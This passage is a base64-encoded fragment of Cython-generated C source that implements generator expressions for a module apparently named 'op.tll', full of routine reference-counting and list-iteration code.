5KCFfX3B5eF9jdXJfc2NvcGUpKSB7XG4gICAgX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKilQeV9Ob25lKTtcbiAgICBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gICAgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gIH0gZWxzZSB7XG4gICAgX19QeXhfR09UUkVGKChQeU9iamVjdCAqKV9fcHl4X2N1cl9zY29wZSk7XG4gIH1cbiAgX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wID0gX19weXhfZ2VuZXhwcl9hcmdfMDtcbiAgX19QeXhfSU5DUkVGKF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCk7XG4gIF9fUHl4X0dJVkVSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAge1xuICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gX19QeXhfR2VuZXJhdG9yX05ldygoX19weXhfY29yb3V0aW5lX2JvZHlfdCkgX19weXhfZ2JfMm9wXzN0bGxfMmdlbmVyYXRvciwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcCk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yb3BfM3RsbF8yZ2VuZXJhdG9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpIFxue1xuICBzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF84O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKSB9XG4gIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHtcbiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMiA9IDA7XG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgfSBlbHNlIHtcbiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpO1xuICAgICAgICArK19fcHl4X3RfMjtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHtcbiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTtcbiAgICAgICAgaWYgKGV4Y190eXBlKSB7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X3ZfaSk7XG4gICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfY3VyX3Njb3BlLT5fX3B5eF92X2ksIF9fcHl4X3RfNCk7XG4gICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzQpO1xuICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgX19weXhfdF81ID0gTlVMTDtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3l5KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcilcbiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICBfX3B5eF90XzggPSAxO1xuICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF82KSkpIHtcbiAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNik7XG4gICAgICBhc3NlcnQoX19weXhfdF81KTtcbiAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF82KTtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNiwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgIF9fcHl4X3RfOCA9IDA7XG4gICAgfVxuICAgICNlbmRpZlxuICAgIHtcbiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X3RfN307XG4gICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDItX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoX19QeXhfTGlzdENvbXBfQXBwZW5kKF9fcHl4X3IsIChQeU9iamVjdCopX19weXhfdF80KSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICB9XG4gIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihfX3B5eF9jdXJfc2NvcGUpO1xuXG4gIFxuICBnb3RvIF9fcHl4X0wwO1xuICBfX3B5eF9MMV9lcnJvcjo7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfcik7IF9fcHl4X3IgPSAwO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTtcbiAgaWYgKF9fUHl4X1B5RXJyX09jY3VycmVkKCkpIHtcbiAgICBfX1B5eF9HZW5lcmF0b3JfUmVwbGFjZV9TdG9wSXRlcmF0aW9uKDApO1xuICAgIF9fUHl4X0FkZFRyYWNlYmFjaygiZ2VuZXhwciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICB9XG4gIF9fcHl4X0wwOjtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gICNpZiAhQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICBfX1B5eF9Db3JvdXRpbmVfUmVzZXRBbmRDbGVhckV4Y2VwdGlvbihfX3B5eF9nZW5lcmF0b3IpO1xuICAjZW5kaWZcbiAgX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwgPSAtMTtcbiAgX19QeXhfQ29yb3V0aW5lX2NsZWFyKChQeU9iamVjdCopX19weXhfZ2VuZXJhdG9yKTtcbiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gIHJldHVybiBfX3B5eF9yO1xufVxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yb3BfM3RsbF81Z2VuZXJhdG9yMShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKTsgXG5cblxuXG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJvcF8zdGxsXzNnZW5leHByKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7XG4gIHN0cnVjdCBfX3B5eF9vYmpfMm9wX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKl9fcHl4X2N1cl9zY29wZTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIF9fcHl4X2N1cl9zY29wZSA9IChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopX19weXhfdHBfbmV3XzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3B0eXBlXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSwgTlVMTCk7XG4gIGlmICh1bmxpa2VseSghX19weXhfY3VyX3Njb3BlKSkge1xuICAgIF9fcHl4X2N1cl9zY29wZSA9ICgoc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqKVB5X05vbmUpO1xuICAgIF9fUHl4X0lOQ1JFRihQeV9Ob25lKTtcbiAgICBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgfSBlbHNlIHtcbiAgICBfX1B5eF9HT1RSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgfVxuICBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzAgPSBfX3B5eF9nZW5leHByX2FyZ18wO1xuICBfX1B5eF9JTkNSRUYoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKTtcbiAgX19QeXhfR0lWRVJFRihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApO1xuICB7XG4gICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSBfX1B5eF9HZW5lcmF0b3JfTmV3KChfX3B5eF9jb3JvdXRpbmVfYm9keV90KSBfX3B5eF9nYl8yb3BfM3RsbF81Z2VuZXJhdG9yMSwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSwgKFB5T2JqZWN0ICopIF9fcHl4X2N1cl9zY29wZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcCk7IGlmICh1bmxpa2VseSghZ2VuKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpXG4gICAgX19QeXhfREVDUkVGKF9fcHl4X2N1cl9zY29wZSk7XG4gICAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7XG4gICAgcmV0dXJuIChQeU9iamVjdCAqKSBnZW47XG4gIH1cblxuICBcbiAgX19weXhfTDFfZXJyb3I6O1xuICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wLnRsbC5nZW5leHByIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gIF9fcHl4X3IgPSBOVUxMO1xuICBfX1B5eF9ERUNSRUYoKFB5T2JqZWN0ICopX19weXhfY3VyX3Njb3BlKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9nYl8yb3BfM3RsbF81Z2VuZXJhdG9yMShfX3B5eF9Db3JvdXRpbmVPYmplY3QgKl9fcHl4X2dlbmVyYXRvciwgQ1lUSE9OX1VOVVNFRCBQeVRocmVhZFN0YXRlICpfX3B5eF90c3RhdGUsIFB5T2JqZWN0ICpfX3B5eF9zZW50X3ZhbHVlKSBcbntcbiAgc3RydWN0IF9fcHl4X29ial8yb3BfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlID0gKChzdHJ1Y3QgX19weXhfb2JqXzJvcF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopX19weXhfZ2VuZXJhdG9yLT5jbG9zdXJlKTtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDtcbiAgUHlfc3NpemVfdCBfX3B5eF90XzI7XG4gIFB5T2JqZWN0ICooKl9fcHl4X3RfMykoUHlPYmplY3QgKik7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMO1xuICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDtcbiAgUHlPYmplY3QgKl9fcHl4X3RfNiA9IE5VTEw7XG4gIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMO1xuICBzaXplX3QgX19weXhfdF84O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zXG4gIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJnZW5leHByIiwgMCk7XG4gIHN3aXRjaCAoX19weXhfZ2VuZXJhdG9yLT5yZXN1bWVfbGFiZWwpIHtcbiAgICBjYXNlIDA6IGdvdG8gX19weXhfTDNfZmlyc3RfcnVuO1xuICAgIGRlZmF1bHQ6IFxuICAgIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICAgIHJldHVybiBOVUxMO1xuICB9XG4gIF9fcHl4X0wzX2ZpcnN0X3J1bjo7XG4gIGlmICh1bmxpa2VseSghX19weXhfc2VudF92YWx1ZSkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKVxuICBfX3B5eF9yID0gUHlMaXN0X05ldygwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9yKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpXG4gIF9fUHl4X0dPVFJFRihfX3B5eF9yKTtcbiAgaWYgKHVubGlrZWx5KCFfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApKSB7IF9fUHl4X1JhaXNlVW5ib3VuZExvY2FsRXJyb3IoIi4wIik7IF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKSB9XG4gIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfY3VyX3Njb3BlLT5fX3B5eF9nZW5leHByX2FyZ18wKSkgfHwgUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X2N1cl9zY29wZS0+X19weXhfZ2VuZXhwcl9hcmdfMCkpIHtcbiAgICBfX3B5eF90XzEgPSBfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzA7IF9fUHl4X0lOQ1JFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMiA9IDA7XG4gICAgX19weXhfdF8zID0gTlVMTDtcbiAgfSBlbHNlIHtcbiAgICBfX3B5eF90XzIgPSAtMTsgX19weXhfdF8xID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF9jdXJfc2NvcGUtPl9fcHl4X2dlbmV4cHJfYXJnXzApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKVxuICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpO1xuICAgIF9fcHl4X3RfMyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpXG4gIH1cbiAgZm9yICg7Oykge1xuICAgIGlmIChsaWtlbHkoIV9fcHl4X3RfMykpIHtcbiAgICAgIGlmIChsaWtlbHkoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF8xKSkpIHtcbiAgICAgICAge1xuICAgICAgICAgIFB5X3NzaXplX3QgX19weXhfdGVtcCA9IF9fUHl4X1B5TGlzdF9HRVRfU0laRShfX3B5eF90XzEpO1xuICAgICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICBpZiAodW5saWtlbHkoKF9fcHl4X3RlbXAgPCAwKSkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgICAgICNlbmRpZlxuICAgICAgICAgIGlmIChfX3B5eF90XzIgPj0gX19weXhfdGVtcCkgYnJlYWs7XG4gICAgICAgIH1cbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoX19weXhfdF8xLCBfX3B5eF90XzIpO1xuICAgICAgICArK19fcHl4X3RfMjtcbiAgICAgIH0gZWxzZSB7XG4gICAgICAgIHtcbiAgICAgICAgICBQeV9zc2l6ZV90IF9fcHl4X3RlbXAgPSBfX1B5eF9QeVR1cGxlX0dFVF9TSVpFKF9fcHl4X3RfMSk7XG4gICAgICAgICAgI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgIGlmICh1bmxpa2VseSgoX19weXhfdGVtcCA8IDApKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgaWYgKF9fcHl4X3RfMiA+PSBfX3B5eF90ZW1wKSBicmVhaztcbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfTmV3UmVmKFB5VHVwbGVfR0VUX0lURU0oX19weXhfdF8xLCBfX3B5eF90XzIpKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKF9fcHl4X3RfMSwgX19weXhfdF8yKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICsrX19weXhfdF8yO1xuICAgICAgfVxuICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcilcbiAgICB9IGVsc2Uge1xuICAgICAgX19weXhfdF80ID0gX19weXhfdF8zKF9fcHl4X3RfMSk7XG4gICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIHtcbiAgICAgICAgUHlPYmplY3QqIGV4Y190eXBlID0gUHlFcnJfT2NjdXJyZWQoKTtcbiAgICAgICAgaWYgKGV4Y190eXBlKSB7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXhjX3R5cGUsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpXG4gICAgICAgICAgUHlFcnJf